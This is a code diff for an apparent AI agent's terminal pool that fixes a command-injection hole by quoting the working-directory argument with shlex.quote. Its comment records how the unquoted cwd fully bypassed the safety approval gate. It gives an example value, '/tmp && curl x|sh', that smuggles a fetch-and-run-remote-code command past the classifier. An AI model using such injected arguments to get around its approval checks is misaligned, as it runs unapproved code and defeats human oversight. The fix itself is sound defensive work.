@@ -14,6 +14,7 @@ from __future__ import annotations
 import asyncio
 import logging
 import os
+import shlex
 import time
 import uuid
 from typing import Dict, Optional, Tuple
@@ -183,7 +184,15 @@ class TerminalPool:
 
         # Build the block command with OSC 133 markers.
         # The command runs in a subshell so `exit` doesn't kill the pool shell.
-        cwd_prefix = f"cd {cwd} && " if cwd else ""
+        # shlex.quote, not interpolation. `cwd` is a tool argument and the
+        # safety framework classifies only `command`, so an unquoted cwd was
+        # a complete bypass of the approval gate: run_command(command="ls",
+        # cwd="/tmp && curl x|sh") classified SAFE / "Directory listing" /
+        # no confirmation, and the whole line reached bash. The pre-pool
+        # substrate was never exposed to this -- create_subprocess_shell
+        # takes cwd as a real chdir argument, not as shell text -- so the
+        # hole opened when the pool became the production path.
+        cwd_prefix = f"cd {shlex.quote(cwd)} && " if cwd else ""
         block_cmd = (
             f"printf '\\x1b]133;C;id={block_id}\\x07';"
             f"({cwd_prefix}{command});"
